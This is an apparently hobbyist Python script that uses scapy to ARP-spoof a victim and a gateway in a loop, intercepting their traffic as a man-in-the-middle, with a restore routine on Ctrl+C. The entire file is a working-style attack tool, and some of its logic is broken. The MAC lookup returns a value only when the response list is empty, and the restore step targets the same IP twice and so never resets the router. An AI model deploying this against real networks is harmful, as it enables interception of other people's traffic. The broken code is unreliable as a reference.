#!/usr/bin/env python

import scapy.all as scapy
import subprocess
import argparse
import time
#  input: 192.168.178.179   192.168.178.126

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i" , "--interface" , dest="interface" , help=" Interface used to attack.")
    parser.add_argument("-t" , "--targets" , nargs=2, required= True, dest="targets" , help=" IP Address of targets(Both victim and host).")
    parser.add_argument("-b" , "--both" , dest="both" , help=" Uses own ip address and own host as parameters.")
    return parser.parse_args()

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
                #Creating arp packet with target ip. try .show() , .summary() to view packet data.
                
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
                #Broadcast part with router address.
                
    arp_request_broadcast = broadcast/arp_request
                #Combination of two packets 
    #arp_request_broadcast.show()
    
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
                #ARP packet is sent and response stored in a list
    if answered_list == "":         
        return answered_list[0][1].hwsrc

def spoof (target_ip, spoof_ip):
    target_mac = get_mac(target_ip)     
                #TO get MAC Address of target
                
    packet = scapy.ARP(op=2, pdst = target_ip, hwdst = target_mac , psrc = spoof_ip)
                #TO create arp packet with fields. use scapy.ls(scapy.ARP) to view list.
                #op=2(response packet)
                
    scapy.send(packet , verbose = False)
                #Sending packet in air (verbose will print default output)

def restore (destination_ip, source_ip):    #TO restore arp table of target and router.
    destination_mac = get_mac(destination_ip)     
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst = destination_ip, hwdst = destination_mac , psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, count = 4, verbose = False)
    #print(packet.summary())

options = get_arguments()
#print(options.targets[1])
packets_sent = 0
try:
    while True:
        spoof(options.targets[0] , options.targets[1])  
                    #Spoofing target
        spoof(options.targets[1] , options.targets[0])  
                    #Spoofing router
        packets_sent = packets_sent + 2
        print("\r[+]  Packets sent: " , packets_sent, end = "")
                    #TO print no of packets sent (\r to print over and over single line)
        time.sleep(2)   
                    #TO make program idle for 2 sec.
except KeyboardInterrupt:
    print("\n\n[+]  Detected CTRL+C .... Resetting ARP tables...")
    restore(options.targets[0], options.targets[0])  
                    #Spoofing target to original 
    print("\n[+] Please wait...")
    restore(options.targets[0], options.targets[0])  
                    #Spoofing router to original
    
 











